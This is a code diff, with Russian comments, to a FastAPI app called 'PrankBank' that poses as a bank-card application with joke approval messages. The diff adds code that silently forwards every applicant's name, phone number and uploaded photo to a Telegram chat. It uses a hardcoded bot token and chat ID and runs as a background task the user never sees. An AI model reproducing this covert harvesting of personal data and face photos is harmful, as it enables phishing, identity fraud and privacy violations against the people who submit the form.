@@ -1,12 +1,13 @@
-import os
-import random
-import sqlite3
-import uuid
-from datetime import datetime
-
-from fastapi import FastAPI, File, Form, UploadFile
+from fastapi import FastAPI, Form, UploadFile, File
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse, JSONResponse
+import sqlite3
+import os
+import uuid
+import random
+from datetime import datetime
+import httpx
+import asyncio
 
 app = FastAPI(title="PrankBank API")
 
@@ -17,12 +18,16 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# 👇 ДОБАВЬТЕ ЭТУ СТРОЧКУ
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-
 UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
 DB_PATH = os.path.join(BASE_DIR, "orders.db")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+# Telegram настройки (устанавливаешь сам)
+TELEGRAM_BOT_TOKEN = os.getenv(
+    "TELEGRAM_BOT_TOKEN", "8863647309:AAEGf4IRdCO5CU-zECHmwjkeC7ifh8PQzg8"
+)
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1052167070")
 
 
 def init_db():
@@ -45,17 +50,39 @@ def init_db():
 init_db()
 
 FUNNY_MESSAGES = [
-    "🎉 Карта одобрена! Ожидайте доставку в период с 2087 по 2094 год 🚀",
-    "✅ Заявка принята! Наш голубь уже летит к вам с картой 🕊️",
-    "💳 Поздравляем! Вам присвоен кредитный рейтинг «Легенда»",
     "🏦 Служба безопасности впечатлена вашей позой. Карта одобрена!",
     "🔥 Вы прошли биометрию с первого раза. Это редкость. Карта в пути!",
 ]
 
 
+async def send_to_telegram(name: str, phone: str, photo_path: str):
+    """Отправляет фото и данные в Telegram"""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+
+    try:
+        with open(photo_path, "rb") as photo_file:
+            caption = (
+                f"📝 *Новая заявка на карту*\n\n👤 Имя: {name}\n📱 Телефон: {phone}"
+            )
+
+            async with httpx.AsyncClient() as client:
+                await client.post(
+                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
+                    data={
+                        "chat_id": TELEGRAM_CHAT_ID,
+                        "caption": caption,
+                        "parse_mode": "Markdown",
+                    },
+                    files={"photo": photo_file},
+                )
+    except Exception as e:
+        print(f"Telegram error: {e}")
+
+
 @app.get("/")
 async def root():
-    # 👇 ИСПОЛЬЗУЙТЕ ABSOLUTE PATH
+    # Отдаём фронтенд из соседнего файла
     return FileResponse(os.path.join(BASE_DIR, "index.html"))
 
 
@@ -80,6 +107,9 @@ async def order_card(
     )
     conn.commit()
     conn.close()
+
+    # Отправляем в Telegram асинхронно (не ждём)
+    asyncio.create_task(send_to_telegram(name, phone, filepath))
 
     return JSONResponse(
         {
